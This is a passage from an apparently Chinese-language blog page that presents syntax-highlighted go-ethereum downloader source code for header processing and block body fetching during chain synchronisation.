class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// processHeaders takes batches of retrieved headers from an input channel and</span></span><br><span class="line"><span class="comment">// keeps processing and scheduling them into the header chain and downloader&#x27;s</span></span><br><span class="line"><span class="comment">// queue until the stream ends or a failure occurs.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Downloader)</span></span> processHeaders(origin <span class="type">uint64</span>, td *big.Int) <span class="type">error</span> &#123;</span><br><span class="line">  <span class="comment">// Keep a count of uncertain headers to roll back</span></span><br><span class="line">  <span class="keyword">var</span> (</span><br><span class="line">    rollback    <span class="type">uint64</span> <span class="comment">// Zero means no rollback (fine as you can&#x27;t unroll the genesis)</span></span><br><span class="line">    rollbackErr <span class="type">error</span></span><br><span class="line">    mode        = d.getMode()</span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> rollback &gt; <span class="number">0</span> &#123;</span><br><span class="line">      lastHeader, lastFastBlock, lastBlock := d.lightchain.CurrentHeader().Number, common.Big0, common.Big0</span><br><span class="line">      <span class="keyword">if</span> mode != LightSync &#123;</span><br><span class="line">        lastFastBlock = d.blockchain.CurrentFastBlock().Number()</span><br><span class="line">        lastBlock = d.blockchain.CurrentBlock().Number()</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> err := d.lightchain.SetHead(rollback - <span class="number">1</span>); err != <span class="literal">nil</span> &#123; <span class="comment">// -1 to target the parent of the first uncertain block</span></span><br><span class="line">        <span class="comment">// We&#x27;re already unwinding the stack, only print the error to make it more visible</span></span><br><span class="line">        log.Error(<span class="string">&quot;Failed to roll back chain segment&quot;</span>, <span class="string">&quot;head&quot;</span>, rollback<span class="number">-1</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">      &#125;</span><br><span class="line">      curFastBlock, curBlock := common.Big0, common.Big0</span><br><span class="line">      <span class="keyword">if</span> mode != LightSync &#123;</span><br><span class="line">        curFastBlock = d.blockchain.CurrentFastBlock().Number()</span><br><span class="line">        curBlock = d.blockchain.CurrentBlock().Number()</span><br><span class="line">      &#125;</span><br><span class="line">      log.Warn(<span class="string">&quot;Rolled back chain segment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;header&quot;</span>, fmt.Sprintf(<span class="string">&quot;%d-&gt;%d&quot;</span>, lastHeader, d.lightchain.CurrentHeader().Number),</span><br><span class="line">        <span class="string">&quot;fast&quot;</span>, fmt.Sprintf(<span class="string">&quot;%d-&gt;%d&quot;</span>, lastFastBlock, curFastBlock),</span><br><span class="line">        <span class="string">&quot;block&quot;</span>, fmt.Sprintf(<span class="string">&quot;%d-&gt;%d&quot;</span>, lastBlock, curBlock), <span class="string">&quot;reason&quot;</span>, rollbackErr)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;()</span><br><span class="line">  <span class="comment">// Wait for batches of headers to process</span></span><br><span class="line">  gotHeaders := <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> &#123;</span><br><span class="line">    <span class="keyword">select</span> &#123;</span><br><span class="line">    <span class="keyword">case</span> &lt;-d.cancelCh:</span><br><span class="line">      rollbackErr = errCanceled</span><br><span class="line">      <span class="keyword">return</span> errCanceled</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> headers := &lt;-d.headerProcCh:</span><br><span class="line">      <span class="comment">// Terminate header processing if we synced up</span></span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">len</span>(headers) == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="comment">// Notify everyone that headers are fully processed</span></span><br><span class="line">        <span class="keyword">for</span> _, ch := <span class="keyword">range</span> []<span class="keyword">chan</span> <span class="type">bool</span>&#123;d.bodyWakeCh, d.receiptWakeCh&#125; &#123;</span><br><span class="line">          <span class="keyword">select</span> &#123;</span><br><span class="line">          <span class="keyword">case</span> ch &lt;- <span class="literal">false</span>:</span><br><span class="line">          <span class="keyword">case</span> &lt;-d.cancelCh:</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// If no headers were retrieved at all, the peer violated its TD promise that it had a</span></span><br><span class="line">        <span class="comment">// better chain compared to ours. The only exception is if its promised blocks were</span></span><br><span class="line">        <span class="comment">// already imported by other means (e.g. fetcher):</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// R &lt;remote peer&gt;, L &lt;local node&gt;: Both at block 10</span></span><br><span class="line">        <span class="comment">// R: Mine block 11, and propagate it to L</span></span><br><span class="line">        <span class="comment">// L: Queue block 11 for import</span></span><br><span class="line">        <span class="comment">// L: Notice that R&#x27;s head and TD increased compared to ours, start sync</span></span><br><span class="line">        <span class="comment">// L: Import of block 11 finishes</span></span><br><span class="line">        <span class="comment">// L: Sync begins, and finds common ancestor at 11</span></span><br><span class="line">        <span class="comment">// L: Request new headers up from 11 (R&#x27;s TD was higher, it must have something)</span></span><br><span class="line">        <span class="comment">// R: Nothing to give</span></span><br><span class="line">        <span class="keyword">if</span> mode != LightSync &#123;</span><br><span class="line">          head := d.blockchain.CurrentBlock()</span><br><span class="line">          <span class="keyword">if</span> !gotHeaders &amp;&amp; td.Cmp(d.blockchain.GetTd(head.Hash(), head.NumberU64())) &gt; <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> errStallingPeer</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// If fast or light syncing, ensure promised headers are indeed delivered. This is</span></span><br><span class="line">        <span class="comment">// needed to detect scenarios where an attacker feeds a bad pivot and then bails out</span></span><br><span class="line">        <span class="comment">// of delivering the post-pivot blocks that would flag the invalid content.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// This check cannot be executed &quot;as is&quot; for full imports, since blocks may still be</span></span><br><span class="line">        <span class="comment">// queued for processing when the header download completes. However, as long as the</span></span><br><span class="line">        <span class="comment">// peer gave us something useful, we&#x27;re already happy/progressed (above check).</span></span><br><span class="line">        <span class="keyword">if</span> mode == FastSync || mode == LightSync &#123;</span><br><span class="line">          head := d.lightchain.CurrentHeader()</span><br><span class="line">          <span class="keyword">if</span> td.Cmp(d.lightchain.GetTd(head.Hash(), head.Number.Uint64())) &gt; <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> errStallingPeer</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Disable any rollback and return</span></span><br><span class="line">        rollback = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Otherwise split the chunk of headers into batches and process them</span></span><br><span class="line">      gotHeaders = <span class="literal">true</span></span><br><span class="line">      <span class="keyword">for</span> <span class="built_in">len</span>(headers) &gt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="comment">// Terminate if something failed in between processing chunks</span></span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> &lt;-d.cancelCh:</span><br><span class="line">          rollbackErr = errCanceled</span><br><span class="line">          <span class="keyword">return</span> errCanceled</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Select the next chunk of headers to import</span></span><br><span class="line">        limit := maxHeadersProcess</span><br><span class="line">        <span class="keyword">if</span> limit &gt; <span class="built_in">len</span>(headers) &#123;</span><br><span class="line">          limit = <span class="built_in">len</span>(headers)</span><br><span class="line">        &#125;</span><br><span class="line">        chunk := headers[:limit]</span><br><span class="line"></span><br><span class="line">        <span class="comment">// In case of header only syncing, validate the chunk immediately</span></span><br><span class="line">        <span class="keyword">if</span> mode == FastSync || mode == LightSync &#123;</span><br><span class="line">          <span class="comment">// If we&#x27;re importing pure headers, verify based on their recentness</span></span><br><span class="line">          <span class="keyword">var</span> pivot <span class="type">uint64</span></span><br><span class="line"></span><br><span class="line">          d.pivotLock.RLock()</span><br><span class="line">          <span class="keyword">if</span> d.pivotHeader != <span class="literal">nil</span> &#123;</span><br><span class="line">            pivot = d.pivotHeader.Number.Uint64()</span><br><span class="line">          &#125;</span><br><span class="line">          d.pivotLock.RUnlock()</span><br><span class="line"></span><br><span class="line">          frequency := fsHeaderCheckFrequency</span><br><span class="line">          <span class="keyword">if</span> chunk[<span class="built_in">len</span>(chunk)<span class="number">-1</span>].Number.Uint64()+<span class="type">uint64</span>(fsHeaderForceVerify) &gt; pivot &#123;</span><br><span class="line">            frequency = <span class="number">1</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> n, err := d.lightchain.InsertHeaderChain(chunk, frequency); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            rollbackErr = err</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If some headers were inserted, track them as uncertain</span></span><br><span class="line">            <span class="keyword">if</span> (mode == FastSync || frequency &gt; <span class="number">1</span>) &amp;&amp; n &gt; <span class="number">0</span> &amp;&amp; rollback == <span class="number">0</span> &#123;</span><br><span class="line">              rollback = chunk[<span class="number">0</span>].Number.Uint64()</span><br><span class="line">            &#125;</span><br><span class="line">            log.Warn(<span class="string">&quot;Invalid header encountered&quot;</span>, <span class="string">&quot;number&quot;</span>, chunk[n].Number, <span class="string">&quot;hash&quot;</span>, chunk[n].Hash(), <span class="string">&quot;parent&quot;</span>, chunk[n].ParentHash, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">            <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%w: %v&quot;</span>, errInvalidChain, err)</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// All verifications passed, track all headers within the alloted limits</span></span><br><span class="line">          <span class="keyword">if</span> mode == FastSync &#123;</span><br><span class="line">            head := chunk[<span class="built_in">len</span>(chunk)<span class="number">-1</span>].Number.Uint64()</span><br><span class="line">            <span class="keyword">if</span> head-rollback &gt; <span class="type">uint64</span>(fsHeaderSafetyNet) &#123;</span><br><span class="line">              rollback = head - <span class="type">uint64</span>(fsHeaderSafetyNet)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              rollback = <span class="number">1</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Unless we&#x27;re doing light chains, schedule the headers for associated content retrieval</span></span><br><span class="line">        <span class="keyword">if</span> mode == FullSync || mode == FastSync &#123;</span><br><span class="line">          <span class="comment">// If we&#x27;ve reached the allowed number of pending headers, stall a bit</span></span><br><span class="line">          <span class="keyword">for</span> d.queue.PendingBlocks() &gt;= maxQueuedHeaders || d.queue.PendingReceipts() &gt;= maxQueuedHeaders &#123;</span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> &lt;-d.cancelCh:</span><br><span class="line">              rollbackErr = errCanceled</span><br><span class="line">              <span class="keyword">return</span> errCanceled</span><br><span class="line">            <span class="keyword">case</span> &lt;-time.After(time.Second):</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// Otherwise insert the headers for content retrieval</span></span><br><span class="line">          inserts := d.queue.Schedule(chunk, origin)</span><br><span class="line">          <span class="keyword">if</span> <span class="built_in">len</span>(inserts) != <span class="built_in">len</span>(chunk) &#123;</span><br><span class="line">            rollbackErr = fmt.Errorf(<span class="string">&quot;stale headers: len inserts %v len(chunk) %v&quot;</span>, <span class="built_in">len</span>(inserts), <span class="built_in">len</span>(chunk))</span><br><span class="line">            <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%w: stale headers&quot;</span>, errBadPeer)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        headers = headers[limit:]</span><br><span class="line">        origin += <span class="type">uint64</span>(limit)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Update the highest block number we know if a higher one is found.</span></span><br><span class="line">      d.syncStatsLock.Lock()</span><br><span class="line">      <span class="keyword">if</span> d.syncStatsChainHeight &lt; origin &#123;</span><br><span class="line">        d.syncStatsChainHeight = origin - <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">      d.syncStatsLock.Unlock()</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Signal the content downloaders of the availablility of new tasks</span></span><br><span class="line">      <span class="keyword">for</span> _, ch := <span class="keyword">range</span> []<span class="keyword">chan</span> <span class="type">bool</span>&#123;d.bodyWakeCh, d.receiptWakeCh&#125; &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> ch &lt;- <span class="literal">true</span>:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="同步-Body"><strong>同步 Body</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fetchBodies iteratively downloads the scheduled block bodies, taking any</span></span><br><span class="line"><span class="comment">// available peers, reserving a chunk of blocks for each, waiting for delivery</span></span><br><span class="line"><span class="comment">// and also periodically checking for timeouts.</span></span><br><span class="line"><span class="title function_">func</span> (d *<span class="title class_">Downloader</span>) <span class="title function_">fetchBodies</span>(<span class="keyword">from</span> uint64) error &#123;</span><br><span class="line">  log.<span class="title class_">Debug</span>(<span class="string">&quot;Downloading block bodies&quot;</span>, <span class="string">&quot;origin&quot;</span>, <span class="keyword">from</span>)</span><br><span class="line"></span><br><span class="line">  <span class="title function_">var</span> (</span><br><span class="line">    deliver = <span class="title function_">func</span>(packet dataPack) (int, error) &#123;</span><br><span class="line">      pack := packet.(*bodyPack)</span><br><span class="line">      <span class="keyword">return</span> d.<span class="property">queue</span>.<span class="title class_">DeliverBodies</span>(pack.<span class="property">peerID</span>, pack.<span class="property">transactions</span>, pack.<span class="property">uncles</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    expire   = <span class="title function_">func</span>() map[string]int &#123; <span class="keyword">return</span> d.<span class="property">queue</span>.<span class="title class_">ExpireBodies</span>(d.<span class="title function_">requestTTL</span>()) &#125;</span><br><span class="line">    fetch    = <span class="title function_">func</span>(p *peerConnection, req *fetchRequest) error &#123; <span class="keyword">return</span> p.<span class="title class_">FetchBodies</span>(req) &#125;</span><br><span class="line">    capacity = <span class="title function_">func</span>(p *peerConnection) int &#123; <span class="keyword">return</span> p.<span class="title class_">BlockCapacity</span>(d.<span class="title function_">requestRTT</span>()) &#125;</span><br><span class="line">    setIdle  = <span class="title function_">func</span>(<span class="params">p *peerConnection, accepted int, deliveryTime time.Time</span>) &#123; p.<span class="title class_">SetBodiesIdle</span>(accepted, deliveryTime) &#125;</span><br><span class="line">  )</span><br><span class="line">  err := d.<span class="title function_">fetchParts</span>(d.<span class="property">bodyCh</span>, deliver, d.<span class="property">bodyWakeCh</span>, expire,</span><br><span class="line">    d.<span class="property">queue</span>.<span class="property">PendingBlocks</span>, d.<span class="property">queue</span>.<span class="property">InFlightBlocks</span>, d.<span class="property">queue</span>.<span class="property">ReserveBodies</span>,</span><br><span class="line">    d.<span class="property">bodyFetchHook</span>, fetch, d.<span class="property">queue</span>.<span class="property">CancelBodies</span>, capacity, d.<span class="property">peers</span>.<span class="property">BodyIdlePeers</span>, setIdle, <span class="string">&quot;bodies&quot;</span>)</span><br><span class="line"></span><br><span class="line">  log.<span class="title class_">Debug</span>(<span class="string">&quot;Block body download terminated&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">  <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// DeliverBodies injects a new batch of block bodies received from a remote node.</span></span><br><span class="line"><span class="title function_">func</span> (d *<span class="title class_">Downloader</span>) <span class="title class_">DeliverBodies</span>(id string, transactions [][]*types.<span class="property">Transaction</span>, uncles [][]*types.<span class="property">Header</span>) error &#123;</span><br><span class="line">  <span class="keyword">return</span> d.<span class="title function_">deliver</span>(d.<span class="property">bodyCh</span>, &amp;bodyPack&#123;id, transactions, uncles&#125;, bodyInMeter, bodyDropMeter)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// deliver injects a new batch of data received from a remote node.</span></span><br><span class="line"><span class="title function_">func</span> (d *<span class="title class_">Downloader</span>) <span class="title function_">deliver</span>(destCh chan dataPack, packet dataPack, inMeter, dropMeter metrics.<span class="property">Meter</span>) (err error) &#123;</span><br><span class="line">  <span class="comment">// Update the delivery metrics for both good and failed deliveries</span></span><br><span class="line">  inMeter.<span class="title class_">Mark</span>(<span class="title function_">int64</span>(packet.<span class="title class_">Items</span>()))</span><br><span class="line">  defer <span class="title function_">func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> err != nil &#123;</span><br><span class="line">      dropMeter.<span class="title class_">Mark</span>(<span class="title function_">int64</span>(packet.<span class="title class_">Items</span>()))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;()</span><br><span class="line">  <span class="comment">// Deliver or abort if the sync is canceled while queuing</span></span><br><span class="line">  d.<span class="property">cancelLock</span>.<span class="title class_">RLock</span>()</span><br><span class="line">  cancel := d.<span class="property">cancelCh</span></span><br><span class="line">  d.<span class="property">cancelLock</span>.<span class="title class_">RUnlock</span>()</span><br><span class="line">  <span class="keyword">if</span> cancel == nil &#123;</span><br><span class="line">    <span class="keyword">return</span> errNoSyncActive</span><br><span class="line">  &#125;</span><br><span class="line">  select &#123;</span><br><span class="line">  <span class="keyword">case</span> destCh &lt;- <span class="attr">packet</span>:</span><br><span class="line">    <span class="keyword">return</span> nil</span><br><span class="line">  <span class="keyword">case</span> &lt;-cancel:</span><br><span class="line">    return errNoSyncActive</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">func (d *Downloader) fetchParts(deliveryCh chan dataPack, deliver func(dataPack) (int, error), wakeCh chan bool,</span><br><span class="line">  expire func() map[string]int, pending func() int, inFlight func() bool, reserve func(*peerConnection, int) (*fetchRequest, bool, bool),</span><br><span class="line">  fetchHook func([]*types.Header), fetch func(*peerConnection, *fetchRequest) error, cancel func(*fetchRequest), capacity func(*peerConnection) int,</span><br><span class="line">  idle func() ([]*peerConnection, int), setIdle func(*peerConnection, int, time.Time), kind string) error &#123;</span><br><span class="line"></span><br><span class="line">  // Create a ticker to detect expired retrieval tasks</span><br><span class="line">  ticker := time.NewTicker(100 * time.Millisecond)</span><br><span class="line">  defer ticker.Stop()</span><br><span class="line"></span><br><span class="line">  update := make(chan struct&#123;&#125;, 1)</span><br><span class="line"></span><br><span class="line">  // Prepare the queue and fetch block parts until the block header fetcher&#x27;s done</span><br><span class="line">  finished := false</span><br><span class="line">  for &#123;</span><br><span class="line">    select &#123;</span><br><span class="line">    case &lt;-d.cancelCh:</span><br><span class="line">      return errCanceled</span><br><span class="line"></span><br><span class="line">    case packet := &lt;-deliveryCh:</span><br><span class="line">      deliveryTime := time.Now()</span><br><span class="line">      // If the peer was previously banned and failed to deliver its pack</span><br><span class="line">      // in a reasonable time frame, ignore its message.</span><br><span class="line">      if peer := d.peers.Peer(packet.PeerId()); peer != nil &#123;</span><br><span class="line">        // Deliver the received chunk of data and check chain validity</span><br><span class="line">        accepted, err := deliver(packet)</span><br><span class="line">        if errors.Is(err, errInvalidChain) &#123;</span><br><span class="line">          return err</span><br><span class="line">        &#125;</span><br><span class="line">        // Unless a peer delivered something completely else than requested (usually</span><br><span class="line">        // caused by a timed out request which came through in the end), set it to</span><br><span class="line">        // idle. If the delivery&#x27;s stale, the peer should have already been idled.</span><br><span class="line">        if !errors.Is(err, errStaleDelivery) &#123;</span><br><span class="line">          setIdle(peer, accepted, deliveryTime)</span><br><span class="line">        &#125;</span><br><span class="line">        // Issue a log to the user to see what&#x27;s going on</span><br><span class="line">        switch &#123;</span><br><span class="line">        case err == nil &amp;&amp; packet.Items() == 0:</span><br><span class="line">          peer.log.Trace(&quot;Requested data not delivered&quot;, &quot;type&quot;, kind)</span><br><span class="line">        case err == nil:</span><br><span class="line">          peer.log.Trace(&quot;Delivered new batch of data&quot;, &quot;type&quot;, kind, &quot;count&quot;, packet.Stats())</span><br><span class="line">        default:</span><br><span class="line">          peer.log.Debug(&quot;Failed to deliver retrieved data&quot;, &quot;type&quot;, kind, &quot;err&quot;, err)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      // Blocks assembled, try to update the progress</span><br><span class="line">      select &#123;</span><br><span class="line">      case update &lt;- struct&#123;&#125;&#123;&#125;:</span><br><span class="line">      default:</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    case cont := &lt;-wakeCh:</span><br><span class="line">      // The header fetcher sent a continuation flag, check if it&#x27;s done</span><br><span class="line">      if !cont &#123;</span><br><span class="line">        finished = true</span><br><span class="line">      &#125;</span><br><span class="line">      // Headers arrive, try to update the progress</span><br><span class="line">      select &#123;</span><br><span class="line">      case update &lt;- struct&#123;&#125;&#123;&#125;:</span><br><span class="line">      default:</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    case &lt;-ticker.C:</span><br><span class="line">      // Sanity check update the progress</span><br><span class="line">      select &#123;</span><br><span class="line">      case update &lt;- struct&#123;&#125;&#123;&#125;:</span><br><span class="line">      default:</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    case &lt;-update:</span><br><span class="line">      // Short circuit if we lost all our peers</span><br><span class="line">      if d.peers.Len() == 0 &#123;</span><br><span class="line">        return errNoPeers</span><br><span class="line">      &#125;</span><br><span class="line">      // Check for fetch request timeouts and demote the responsible peers</span><br><span class="line">      for pid, fails := range expire() &#123;</span><br><span class="line">        if peer := d.peers.Peer(pid); peer != nil &#123;</span><br><span class="line">          // If a lot of retrieval elements expired, we might have overestimated the remote peer or perhaps</span><br><span class="line">          // ourselves. Only reset to minimal 